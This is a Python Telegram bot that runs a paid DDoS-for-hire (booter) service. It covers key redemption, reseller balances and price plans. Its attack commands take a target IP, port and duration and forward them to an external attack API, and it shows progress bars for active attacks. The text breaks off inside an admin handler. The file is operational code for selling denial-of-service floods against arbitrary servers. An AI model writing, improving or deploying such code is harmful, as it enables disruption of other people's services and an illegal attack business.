#!/usr/bin/python3

import requests
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
import datetime
import os
import time
import secrets
import threading
import json
from datetime import timedelta
from threading import Timer
import pytz

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  CONFIG (Optimized Threading)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BOT_TOKEN = os.environ.get("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=32)

ADMIN_IDS = {"7212246299"} # Ensure your ID is here

ATTACK_API_URL = "http://YOUR_API_DOMAIN_OR_IP/api/attack?ip={ip}&port={port}&time={time}"
DASHBOARD_URL = "https://zeromiss.netlify.app/" 

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  PERSISTENT DATA STORAGE 
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
DATA_DIR = "/data" if os.path.exists("/data") else "data"
os.makedirs(DATA_DIR, exist_ok=True)

USER_FILE        = os.path.join(DATA_DIR, "users.txt")
LOG_FILE         = os.path.join(DATA_DIR, "log.txt")
USER_ACCESS_FILE = os.path.join(DATA_DIR, "users_access.txt")
KEYS_FILE        = os.path.join(DATA_DIR, "keys.txt")
KEY_HISTORY_FILE = os.path.join(DATA_DIR, "key_history.txt") 
RESELLERS_FILE   = os.path.join(DATA_DIR, "resellers.txt") 
BALANCE_FILE     = os.path.join(DATA_DIR, "balances.txt")
ALL_USERS_FILE   = os.path.join(DATA_DIR, "all_users.txt")
TRIAL_KEYS_FILE  = os.path.join(DATA_DIR, "trial_keys.txt")
TRIAL_USERS_FILE = os.path.join(DATA_DIR, "trial_users.txt")

ist = pytz.timezone('Asia/Kolkata')

KEY_PLANS = {
    "12hr":  {"duration": timedelta(hours=12), "cost": 30},
    "1day":  {"duration": timedelta(days=1),   "cost": 60},
    "3day":  {"duration": timedelta(days=3),   "cost": 180},
    "7day":  {"duration": timedelta(days=7),   "cost": 300},
    "30day": {"duration": timedelta(days=30),  "cost": 1000},
    "60day": {"duration": timedelta(days=60),  "cost": 1900},
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  DATA HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def read_file_lines(filename) -> set:
    try:
        with open(filename, "r") as f: return {l.strip() for l in f if l.strip()}
    except FileNotFoundError: return set()

def save_file_lines(filename, data_set: set):
    with open(filename, "w") as f:
        for item in data_set: f.write(f"{item}\n")

def read_users() -> list:
    try:
        with open(USER_FILE, "r") as f: return [l.strip() for l in f if l.strip()]
    except FileNotFoundError: return []

def save_users(users: list):
    with open(USER_FILE, "w") as f:
        for uid in users: f.write(f"{uid}\n")

def read_user_access() -> dict:
    data = {}
    try:
        with open(USER_ACCESS_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if ":" in line:
                    uid, expiry = line.split(":", 1)
                    data[uid] = {"expiry_time": float(expiry)}
    except FileNotFoundError: pass
    return data

def save_user_access(data: dict):
    with open(USER_ACCESS_FILE, "w") as f:
        for uid, info in data.items(): f.write(f"{uid}:{info['expiry_time']}\n")

def read_keys() -> dict:
    keys = {}
    try:
        with open(KEYS_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if "|" in line:
                    parts = line.split("|", 1)
                    keys[parts[0].strip()] = parts[1].strip()
    except FileNotFoundError: pass
    return keys

def save_keys(keys: dict):
    with open(KEYS_FILE, "w") as f:
        for key, plan in keys.items(): f.write(f"{key}|{plan}\n")

def read_resellers() -> dict:
    resellers = {}
    try:
        with open(RESELLERS_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if not line: continue
                parts = line.split("|")
                resellers[parts[0]] = parts[1] if len(parts) > 1 else "Unknown"
    except FileNotFoundError: pass
    return resellers

def save_resellers(resellers_dict: dict):
    with open(RESELLERS_FILE, "w") as f:
        for uid, username in resellers_dict.items(): f.write(f"{uid}|{username}\n")

def read_key_history() -> dict:
    history = {}
    try:
        with open(KEY_HISTORY_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if not line: continue
                parts = line.split("|")
                if len(parts) >= 4:
                    history[parts[0]] = {"plan": parts[1], "creator": parts[2], "status": parts[3]}
    except FileNotFoundError: pass
    return history

def save_key_history(history_dict: dict):
    with open(KEY_HISTORY_FILE, "w") as f:
        for key, data in history_dict.items():
            f.write(f"{key}|{data['plan']}|{data['creator']}|{data['status']}\n")

def read_trial_keys() -> dict:
    keys = {}
    try:
        with open(TRIAL_KEYS_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if not line: continue
                parts = line.split("|")
                if len(parts) >= 3:
                    keys[parts[0]] = {"duration": float(parts[1]), "max_uses": int(parts[2]), "used_by": parts[3].split(",") if len(parts) > 3 and parts[3] else []}
    except FileNotFoundError: pass
    return keys

def save_trial_keys(keys: dict):
    with open(TRIAL_KEYS_FILE, "w") as f:
        for key, data in keys.items():
            f.write(f"{key}|{data['duration']}|{data['max_uses']}|{','.join(data['used_by'])}\n")

def read_balances() -> dict:
    balances = {}
    try:
        with open(BALANCE_FILE, "r") as f:
            for line in f:
                line = line.strip()
                if ":" in line:
                    uid, bal = line.split(":", 1)
                    try: balances[uid.strip()] = int(bal.strip())
                    except ValueError: balances[uid.strip()] = 0
    except FileNotFoundError: pass
    return balances

def save_balances(balances: dict):
    with open(BALANCE_FILE, "w") as f:
        for uid, bal in balances.items(): f.write(f"{uid}:{bal}\n")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  STATE & CACHE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
all_known_users: set   = read_file_lines(ALL_USERS_FILE)
trial_users: set       = read_file_lines(TRIAL_USERS_FILE)
allowed_user_ids: list = read_users()
user_access: dict      = read_user_access()
active_keys: dict      = read_keys()
key_history: dict      = read_key_history() 
resellers_data: dict   = read_resellers()   
trial_keys: dict       = read_trial_keys()
balances: dict         = read_balances()
bgmi_cooldown = {} 
active_attacks = {} 

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  UTILITIES & UI HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def fmt_expiry(ts: float) -> str: return datetime.datetime.fromtimestamp(ts, tz=ist).strftime('%d %b %Y • %I:%M %p IST')
def generate_key(prefix="KEY-") -> str: return prefix + secrets.token_hex(8).upper()
def is_admin(uid: str) -> bool: return uid in ADMIN_IDS
def is_reseller(uid: str) -> bool: return uid in resellers_data
def is_admin_or_reseller(uid: str) -> bool: return is_admin(uid) or is_reseller(uid)
def get_balance(uid: str) -> int: return balances.get(uid, 0)
def no_access_msg() -> str: return "⛔ <b>𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗</b> ⛔\n\nYou don't have an active subscription!\nPlease use <code>/redeem</code> to activate."
def admin_only_msg() -> str: return "🛑 <b>Error:</b> Restricted to <b>Admins</b> only."
def admin_reseller_only_msg() -> str: return "🛑 <b>Error:</b> Restricted to <b>Admins</b> and <b>Resellers</b>."

def log_action(user_id: str, action: str, message=None):
    username = f"@{message.from_user.username}" if message and message.from_user.username else f"ID:{user_id}"
    now = datetime.datetime.now(ist).strftime("%d-%m-%Y %H:%M:%S")
    with open(LOG_FILE, "a") as f: f.write(f"[{now}] {username} | {action}\n")

def count_keys_generated_by(user_id: str) -> int:
    return sum(1 for k, v in key_history.items() if v["creator"] == user_id)

def update_reseller_username(message):
    uid = str(message.chat.id)
    if uid in resellers_data and message.from_user.username:
        new_username = f"@{message.from_user.username}"
        if resellers_data[uid] != new_username:
            resellers_data[uid] = new_username
            save_resellers(resellers_data)

def build_profile_text(user_id, username_str):
    role = "👑 Admin" if is_admin(user_id) else ("🤝 Reseller" if is_reseller(user_id) else "👤 User")
    expiry = f"⏳ <b>Expires:</b> {fmt_expiry(user_access[user_id]['expiry_time'])}" if user_id in user_access else "⏳ <b>Expires:</b> ❌ No Active Plan"
    bal = f"\n💵 <b>Balance:</b> ₹{get_balance(user_id)}" if is_reseller(user_id) or is_admin(user_id) else ""
    return f"👤 <b>𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗜𝗡𝗙𝗢</b>\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 <b>ID:</b> <code>{user_id}</code>\n📛 <b>Username:</b> {username_str}\n🎭 <b>Role:</b> {role}\n{expiry}{bal}\n━━━━━━━━━━━━━━━━━━━━━━"

def is_cancel(message):
    if not message.text:
        bot.clear_step_handler_by_chat_id(message.chat.id)
        bot.reply_to(message, "🚫 <b>Invalid input. Operation cancelled.</b>", parse_mode="HTML")
        return True
    if message.text.startswith('/'):
        bot.clear_step_handler_by_chat_id(message.chat.id)
        bot.reply_to(message, "🚫 <b>Operation cancelled.</b>", parse_mode="HTML")
        return True
    return False

@bot.message_handler(commands=['cancel'])
def cancel_cmd(message):
    bot.clear_step_handler_by_chat_id(message.chat.id)
    bot.reply_to(message, "✅ Active operations cancelled.", parse_mode="HTML")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  PAGINATION ENGINE (SCALABILITY)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def gen_page_markup(prefix, current_page, total_pages):
    markup = InlineKeyboardMarkup()
    row = []
    if current_page > 0:
        row.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"{prefix}_{current_page - 1}"))
    if current_page < total_pages - 1:
        row.append(InlineKeyboardButton("Next ➡️", callback_data=f"{prefix}_{current_page + 1}"))
    if row: markup.add(*row)
    return markup

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  EXPIRY MANAGEMENT 
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def remove_expired_users():
    current_time = time.time()
    expired = [uid for uid, info in user_access.items() if info["expiry_time"] <= current_time]

    for uid in expired:
        try: bot.send_message(uid, "⏰ <b>Your access plan has expired!</b>\nUse <code>/redeem</code> to reactivate.", parse_mode="HTML")
        except: pass
        user_access.pop(uid, None)
        if uid in allowed_user_ids: allowed_user_ids.remove(uid)
        if uid in trial_users:
            trial_users.remove(uid)
            save_file_lines(TRIAL_USERS_FILE, trial_users)

    if expired:
        save_users(allowed_user_ids)
        save_user_access(user_access)

    Timer(60, remove_expired_users).start()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  UI & DASHBOARD MENU
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = str(message.chat.id)
    update_reseller_username(message)
    if user_id not in all_known_users:
        all_known_users.add(user_id)
        save_file_lines(ALL_USERS_FILE, all_known_users)

    name = message.from_user.first_name
    markup = InlineKeyboardMarkup(row_width=2)
    is_paid = user_id in allowed_user_ids and user_id in user_access and user_access[user_id]["expiry_time"] > time.time()
    
    if is_paid:
        markup.add(InlineKeyboardButton("🖥️ Launch Dashboard", web_app=WebAppInfo(url=DASHBOARD_URL)))
    
    markup.add(
        InlineKeyboardButton("🚀 Quick Attack", callback_data="ui_attack"),
        InlineKeyboardButton("📊 Live Status", callback_data="ui_status"),
        InlineKeyboardButton("💳 My Profile", callback_data="ui_profile"),
        InlineKeyboardButton("🔑 Redeem Key", callback_data="ui_redeem")
    )

    if is_paid: res = f"🚀 <b>𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗯𝗮𝗰𝗸, {name}!</b> 🚀\n\n👑 <b>𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗔𝗰𝗰𝗲𝘀𝘀 𝗔𝗰𝘁𝗶𝘃𝗲</b>\n\n<i>Use the buttons below or launch the Web Dashboard!</i>"
    else: res = f"🚀 <b>𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗕𝗼𝘁, {name}!</b> 🚀\n\n⛔ <b>𝗡𝗼 𝗔𝗰𝘁𝗶𝘃𝗲 𝗣𝗹𝗮𝗻</b>\n\n<i>Please click 'Redeem Key' below to activate your access!</i>"

    bot.reply_to(message, res, reply_markup=markup, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data.startswith("ui_"))
def handle_inline_buttons(call):
    user_id = str(call.message.chat.id)
    username_str = f"@{call.from_user.username}" if call.from_user.username else "—"

    if call.data == "ui_profile":
        bot.send_message(user_id, build_profile_text(user_id, username_str), parse_mode="HTML")
    elif call.data == "ui_status":
        attack_status(call.message) 
    elif call.data == "ui_redeem":
        msg = bot.send_message(user_id, "🔑 <b>Enter the key you want to redeem:</b>\n<i>(Type /cancel to abort)</i>", parse_mode="HTML")
        bot.register_next_step_handler(msg, redeem_step)
    elif call.data == "ui_attack":
        if user_id not in allowed_user_ids or user_access.get(user_id, {}).get("expiry_time", 0) < time.time():
            bot.send_message(user_id, no_access_msg(), parse_mode="HTML")
        else:
            msg = bot.send_message(user_id, "🎯 <b>Enter Target IP:</b>\n<i>(Type /cancel to abort)</i>", parse_mode="HTML")
            bot.register_next_step_handler(msg, attack_step_ip)
    bot.answer_callback_query(call.id)

@bot.message_handler(content_types=['web_app_data'])
def handle_webapp_data(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids or user_access.get(user_id, {}).get("expiry_time", 0) < time.time():
        return bot.reply_to(message, no_access_msg(), parse_mode="HTML")
    try:
        data = json.loads(message.web_app_data.data)
        execute_attack(message, data.get("ip"), int(data.get("port")), int(data.get("time")))
    except Exception:
        bot.reply_to(message, f"❌ Error processing Web App data.", parse_mode="HTML")

@bot.message_handler(commands=['help'])
def show_help(message):
    update_reseller_username(message)
    bot.reply_to(message,
        "📋 <b>𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 𝗠𝗘𝗡𝗨</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        "👤 <b>USER</b>\n🔹 /start → Menu\n🔹 /id → Profile\n🔹 /redeem → Activate Key\n🔹 /status → Bot Status\n\n"
        "🤝 <b>RESELLER</b>\n🔸 /prices → Price list\n🔸 /genkey → Make Keys\n🔸 /listkeys → View Unused\n🔸 /deletekey → Remove Key\n🔸 /balance → Your funds\n\n"
        "🛠 <b>ADMIN</b>\n⚙️ /admincmd → Admin Panel\n━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode="HTML"
    )

@bot.message_handler(commands=['rules', 'prices', 'id', 'plan', 'myplan', 'mylogs'])
def handle_basic_commands(message):
    user_id = str(message.chat.id)
    update_reseller_username(message)
    cmd = message.text.split()[0].lower()
    
    if cmd == '/rules': bot.reply_to(message, "📜 <b>𝗥𝗨𝗟𝗘𝗦</b>\n1️⃣ No sharing keys.\n2️⃣ One key = one account.\n3️⃣ No refunds.", parse_mode="HTML")
    elif cmd == '/prices':
        if not is_admin_or_reseller(user_id): return bot.reply_to(message, admin_reseller_only_msg(), parse_mode="HTML")
        lines = ["💰 <b>𝗞𝗘𝗬 𝗣𝗥𝗜𝗖𝗘 𝗟𝗜𝗦𝗧</b>\n━━━━━━━━━━━━━━━━━━━━━━"]
        for plan, info in KEY_PLANS.items(): lines.append(f"📦 <b>{plan.ljust(8)}</b> - ₹{info['cost']}")
        bot.reply_to(message, "\n".join(lines), parse_mode="HTML")
    elif cmd == '/id':
        bot.reply_to(message, build_profile_text(user_id, f"@{message.from_user.username}" if message.from_user.username else "—"), parse_mode="HTML")
    elif cmd in ['/plan', '/myplan']:
        if user_id not in allowed_user_ids: return bot.reply_to(message, no_access_msg(), parse_mode="HTML")
        bot.reply_to(message, f"📅 <b>𝗬𝗢𝗨𝗥 𝗣𝗟𝗔𝗡</b>\n⏳ <b>Expires:</b> {fmt_expiry(user_access[user_id]['expiry_time'])}", parse_mode="HTML")
    elif cmd == '/mylogs':
        if user_id not in allowed_user_ids: return bot.reply_to(message, no_access_msg(), parse_mode="HTML")
        try:
            with open(LOG_FILE, "r") as f: lines = f.readlines()
            logs = [l.strip() for l in lines if f"ID:{user_id}" in l or (message.from_user.username and f"@{message.from_user.username}" in l)]
            if logs: bot.reply_to(message, f"📋 <b>𝗬𝗢𝗨𝗥 𝗔𝗖𝗧𝗜𝗩𝗜𝗧𝗬</b>\n" + "\n".join(logs[-15:]), parse_mode="HTML")
            else: bot.reply_to(message, "📝 No activity found.")
        except: bot.reply_to(message, "📝 No logs found.")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  CONVERSATIONAL USER COMMANDS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@bot.message_handler(commands=['redeem'])
def redeem_cmd(message):
    parts = message.text.split()
    if len(parts) > 1: execute_redeem(message, parts[1].strip().upper())
    else:
        msg = bot.reply_to(message, "🔑 <b>Enter the key you want to redeem:</b>\n<i>(Type /cancel to abort)</i>", parse_mode="HTML")
        bot.register_next_step_handler(msg, redeem_step)

def redeem_step(message):
    if is_cancel(message): return
    execute_redeem(message, message.text.strip().upper())

def execute_redeem(message, key):
    user_id = str(message.chat.id)
    if user_id not in all_known_users:
        all_known_users.add(user_id)
        save_file_lines(ALL_USERS_FILE, all_known_users)

    now = datetime.datetime.now(ist)
    if key in active_keys:
        plan_label = active_keys[key]
        duration_sec = KEY_PLANS[plan_label]["duration"].total_seconds()
        if key in key_history:
            key_history[key]["status"] = f"USED_BY:{user_id}"
            save_key_history(key_history)
        del active_keys[key]
        save_keys(active_keys)
        if user_id in trial_users:
            trial_users.remove(user_id)
            save_file_lines(TRIAL_USERS_FILE, trial_users)
    elif key in trial_keys:
        t_data = trial_keys[key]
        if user_id in t_data["used_by"]: return bot.reply_to(message, "❌ You already used this trial!", parse_mode="HTML")
        if len(t_data["used_by"]) >= t_data["max_uses"]: return bot.reply_to(message, "❌ Trial key is full!", parse_mode="HTML")
        duration_sec = t_data["duration"]
        t_data["used_by"].append(user_id)
        save_trial_keys(trial_keys)
        trial_users.add(user_id)
        save_file_lines(TRIAL_USERS_FILE, trial_users)
        plan_label = "Free Trial"
    else: return bot.reply_to(message, "❌ <b>𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗞𝗘𝗬</b>", parse_mode="HTML")

    current_exp = user_access.get(user_id, {}).get("expiry_time", now.timestamp())
    expiry_ts = (datetime.datetime.fromtimestamp(max(current_exp, now.timestamp())) + timedelta(seconds=duration_sec)).timestamp()
    
    if user_id not in allowed_user_ids:
        allowed_user_ids.append(user_id)
        save_users(allowed_user_ids)
    user_access[user_id] = {"expiry_time": expiry_ts}
    save_user_access(user_access)

    log_action(user_id, f"Redeemed key | plan={plan_label}", message)
    bot.reply_to(message, f"✅ <b>𝗞𝗘𝗬 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗!</b>\n📦 <b>Plan:</b> {plan_label}\n⏳ <b>Expires:</b> {fmt_expiry(expiry_ts)}\n\n<i>Click /start to open the dashboard!</i>", parse_mode="HTML")

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    user_id = str(message.chat.id)
    update_reseller_username(message)
    if user_id not in allowed_user_ids or user_access.get(user_id, {}).get("expiry_time", 0) < time.time():
        return bot.reply_to(message, no_access_msg(), parse_mode="HTML")

    parts = message.text.split()
    if len(parts) == 4: execute_attack(message, parts[1], parts[2], parts[3])
    else:
        msg = bot.reply_to(message, "🎯 <b>Enter Target IP:</b>\n<i>(Type /cancel to abort)</i>", parse_mode="HTML")
        bot.register_next_step_handler(msg, attack_step_ip)

def attack_step_ip(message):
    if is_cancel(message): return
    ip = message.text.strip()
    msg = bot.reply_to(message, "🔌 <b>Enter Target Port:</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, attack_step_port, ip)

def attack_step_port(message, ip):
    if is_cancel(message): return
    port = message.text.strip()
    msg = bot.reply_to(message, "⏱️ <b>Enter Attack Duration (Max 600s):</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, attack_step_time, ip, port)

def attack_step_time(message, ip, port):
    if is_cancel(message): return
    execute_attack(message, ip, port, message.text.strip())

def execute_attack(message, target, port_str, time_str):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids or user_access.get(user_id, {}).get("expiry_time", 0) < time.time():
        return bot.reply_to(message, no_access_msg(), parse_mode="HTML")

    if not is_admin(user_id):
        time_passed = (datetime.datetime.now() - bgmi_cooldown.get(user_id, datetime.datetime.min)).total_seconds()
        if time_passed < 60: return bot.reply_to(message, f"⏳ <b>Cooldown!</b> Wait {int(60 - time_passed)}s.", parse_mode="HTML")

    try: port, time_val = int(port_str), int(time_str)
    except ValueError: return bot.reply_to(message, "❌ Port and Time must be numbers.", parse_mode="HTML")

    if time_val > 600: return bot.reply_to(message, "❌ Max time is 600s.", parse_mode="HTML")

    bgmi_cooldown[user_id] = datetime.datetime.now()
    active_attacks[user_id] = {"target": f"{target}:{port}", "start_time": time.time(), "duration": time_val}
    log_action(user_id, f"Attack → IP: {target} | Port: {port} | Time: {time_val}s", message)
    
    bot.reply_to(message, f"⚡ <b>𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁!</b> ⚡\n🎯 <b>Target:</b> <code>{target}:{port}</code>\n⏱️ <b>Time:</b> {time_val}s", parse_mode="HTML")
    threading.Thread(target=run_attack_api, args=(message.chat.id, user_id, target, port, time_val)).start()

def run_attack_api(chat_id, user_id, target, port, time_val):
    try:
        resp = requests.get(ATTACK_API_URL.format(ip=target, port=port, time=time_val), timeout=10)
        if resp.status_code == 200:
            time.sleep(time_val)
            bot.send_message(chat_id, f"🚀 <b>𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱!</b> 🚀\n🎯 <b>Target:</b> <code>{target}:{port}</code>\n⏱️ <b>Duration:</b> {time_val}s", parse_mode="HTML")
        else: bot.send_message(chat_id, f"⚠️ <b>API Error:</b> {resp.status_code}", parse_mode="HTML")
    except: bot.send_message(chat_id, f"❌ <b>Connection Failed:</b> API Offline.", parse_mode="HTML")
    finally:
        if user_id in active_attacks: del active_attacks[user_id]

@bot.message_handler(commands=['status'])
def attack_status(message):
    tot = len(active_attacks)
    status_msg = f"╔══════════════════════════╗\n║  🔥 <b>𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗨𝗦</b> 🔥        ║\n╠══════════════════════════╣\n║  📊 Total Active: {tot}               ║\n╚══════════════════════════╝\n\n"
    if tot == 0: status_msg += "<i>No active attacks right now.</i>"
    else:
        now = time.time()
        for uid, att in list(active_attacks.items()):
            elapsed, rem = now - att["start_time"], max(0, int(att["duration"] - (now - att["start_time"])))
            perc = 100 if rem == 0 else int((elapsed / att["duration"]) * 100)
            bar = ("🟢" * int(perc / 10)) + ("⚫" * (10 - int(perc / 10)))
            status_msg += f"┌─────────────────────────┐\n│ 🎯 <code>{att['target']}</code>\n│ ⏱️ {rem}s remaining\n│ {bar} {perc}%\n└─────────────────────────┘\n"
    bot.reply_to(message, status_msg, parse_mode="HTML")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  CONVERSATIONAL RESELLER COMMANDS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@bot.message_handler(commands=['genkey'])
def genkey_cmd(message):
    user_id = str(message.chat.id)
    if not is_admin_or_reseller(user_id): return bot.reply_to(message, admin_reseller_only_msg(), parse_mode="HTML")
    parts = message.text.split()
    if len(parts) >= 2: execute_genkey(message, parts[1], parts[2] if len(parts)>=3 else "1")
    else:
        msg = bot.reply_to(message, f"📦 <b>Which plan do you want to generate?</b>\nAvailable: {', '.join(KEY_PLANS.keys())}\n<i>(Type /cancel to abort)</i>", parse_mode="HTML")
        bot.register_next_step_handler(msg, genkey_plan_step)

def genkey_plan_step(message):
    if is_cancel(message): return
    plan = message.text.strip()
    if plan not in KEY_PLANS: return bot.reply_to(message, "❌ Invalid plan. Operation cancelled.", parse_mode="HTML")
    msg = bot.reply_to(message, "🔢 <b>How many keys do you want to generate?</b> (Enter 1 to 50)", parse_mode="HTML")
    bot.register_next_step_handler(msg, genkey_amount_step, plan)

def genkey_amount_step(message, plan):
    if is_cancel(message): return
    execute_genkey(message, plan, message.text.strip())

def execute_genkey(message, plan, amount_str):
    user_id = str(message.chat.id)
    if plan not in KEY_PLANS: return bot.reply_to(message, "❌ Invalid Plan.", parse_mode="HTML")
    try:
        amount = int(amount_str)
        if not (1 <= amount <= 50): raise ValueError
    except ValueError: return bot.reply_to(message, "❌ Amount must be between 1 and 50.", parse_mode="HTML")

    total_cost = KEY_PLANS[plan]["cost"] * amount
    if is_reseller(user_id) and not is_admin(user_id):
        if get_balance(user_id) < total_cost:
            return bot.reply_to(message, f"❌ <b>𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗕𝗔𝗟𝗔𝗡𝗖𝗘</b>\n💰 Needed: ₹{total_cost} | Bal: ₹{get_balance(user_id)}", parse_mode="HTML")
        balances[user_id] -= total_cost
        save_balances(balances)

    gen_keys = []
    for _ in range(amount):
        k = generate_key()
        active_keys[k], key_history[k] = plan, {"plan": plan, "creator": user_id, "status": "UNUSED"}
        gen_keys.append(k)
        
    save_keys(active_keys); save_key_history(key_history)
    log_action(user_id, f"Generated {amount} key(s) | plan={plan} | cost=₹{total_cost}", message)
    
    bot.reply_to(message, f"🔑 <b>𝗞𝗘𝗬(𝗦) 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘𝗗!</b>\n\n" + "\n".join([f"<code>{k}</code>" for k in gen_keys]) + f"\n\n📦 <b>Plan:</b> {plan}\n💰 <b>Cost:</b> ₹{total_cost}", parse_mode="HTML")

@bot.message_handler(commands=['deletekey'])
def delete_key_cmd(message):
    user_id = str(message.chat.id)
    if not is_admin_or_reseller(user_id): return bot.reply_to(message, admin_reseller_only_msg(), parse_mode="HTML")
    parts = message.text.split()
    if len(parts) > 1: execute_deletekey(message, parts[1])
    else:
        msg = bot.reply_to(message, "🗑️ <b>Enter the key you want to delete:</b>\n<i>(Type /cancel to abort)</i>", parse_mode="HTML")
        bot.register_next_step_handler(msg, deletekey_step)

def deletekey_step(message):
    if is_cancel(message): return
    execute_deletekey(message, message.text.strip())

def execute_deletekey(message, key_str):
    user_id, key = str(message.chat.id), key_str.upper()
    if not is_admin(user_id) and key in key_history and key_history[key]["creator"] != user_id:
        return bot.reply_to(message, "❌ You can only delete keys that you generated.", parse_mode="HTML")
    if key in active_keys:
        del active_keys[key]
        save_keys(active_keys)
        if key in key_history:
            key_history[key]["status"] = "DELETED"
            save_key_history(key_history)
        bot.reply_to(message, f"✅ <b>Key successfully deleted.</b>", parse_mode="HTML")
    else: bot.reply_to(message, "❌ Key not found or already used.", parse_mode="HTML")

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.chat.id)
    parts = message.text.split()
    if is_admin(user_id) and len(parts) > 1:
        target = parts[1]
        return bot.reply_to(message, f"💰 <b>Reseller:</b> <code>{target}</code> ({resellers_data.get(target, 'Unknown')})\n💵 <b>Balance:</b> ₹{get_balance(target)}", parse_mode="HTML")
    if is_reseller(user_id) or is_admin(user_id):
        return bot.reply_to(message, f"💰 <b>Your Balance:</b> ₹{get_balance(user_id)}", parse_mode="HTML")
    bot.reply_to(message, "❌ You are not a reseller.", parse_mode="HTML")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  PAGINATED LIST COMMANDS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@bot.message_handler(commands=['listkeys'])
def listkeys_cmd(message):
    user_id = str(message.chat.id)
    if not is_admin_or_reseller(user_id): return bot.reply_to(message, admin_reseller_only_msg(), parse_mode="HTML")
    user_unused_keys = {k: p for k, p in active_keys.items() if is_admin(user_id) or (k in key_history and key_history[k]["creator"] == user_id)}
    if not user_unused_keys: return bot.reply_to(message, "⚠️ No unused keys available.", parse_mode="HTML")
    send_listkeys_page(message.chat.id, list(user_unused_keys.items()), 0)

def send_listkeys_page(chat_id, keys_list, page, message_id=None):
    per_page = 15
    total_pages = max(1, (len(keys_list) + per_page - 1) // per_page)
    page_items = keys_list[page*per_page : (page+1)*per_page]
    
    text = f"🔑 <b>𝗨𝗡𝗨𝗦𝗘𝗗 𝗞𝗘𝗬𝗦 (Page {page+1}/{total_pages})</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for k, plan in page_items: text += f"🔸 <code>{k}</code> [{plan}]\n"
    
    markup = gen_page_markup("keypage", page, total_pages)
    if message_id: bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode="HTML")
    else: bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data.startswith("keypage_"))
def keypage_callback(call):
    page = int(call.data.split("_")[1])
    user_id = str(call.message.chat.id)
    user_unused_keys = {k: p for k, p in active_keys.items() if is_admin(user_id) or (k in key_history and key_history[k]["creator"] == user_id)}
    send_listkeys_page(call.message.chat.id, list(user_unused_keys.items()), page, call.message.message_id)
    bot.answer_callback_query(call.id)

@bot.message_handler(commands=['resellers'])
def resellers_cmd(message):
    if not is_admin(str(message.chat.id)): return bot.reply_to(message, admin_only_msg(), parse_mode="HTML")
